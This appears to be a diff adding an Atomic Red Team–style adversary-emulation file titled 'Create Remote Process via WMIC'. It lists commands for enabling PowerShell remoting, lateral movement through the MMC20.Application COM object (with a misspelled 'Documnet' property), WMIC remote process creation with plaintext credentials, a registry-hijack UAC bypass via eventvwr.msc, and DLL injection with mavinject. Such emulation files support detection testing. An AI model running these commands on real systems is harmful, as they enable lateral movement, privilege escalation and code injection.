@@ -1,0 +1,22 @@
+Create Remote Process via WMIC
+
+Atomic Test #1 - Enable Windows Remote Management
+
+PS>Enable-PSRemoting -Force
+
+
+Atomic Test #2 - PowerShell Lateral Movement
+Powershell lateral movement using the mmc20 application com object
+
+PS>powershell.exe [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","windows")).Documnet.ActiveView.ExecuteShellCommand("c:\windows\system32\cmd.exe", $null, $null, "7")
+
+
+Atomic Test #3 - WMIC Process Call Create
+Utilize WMIC to start remote process
+
+wmic /user:lprabakaran /password:toor /node:windows process call create "C:\Windows\system32\calc.exe"
+
+
+reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f cmd.exe /c eventvwr.msc
+
+mavinject $pid /INJECTRUNNING C:\AtomicRedTeam\atomics\T1055\src\x64\T1055.dll
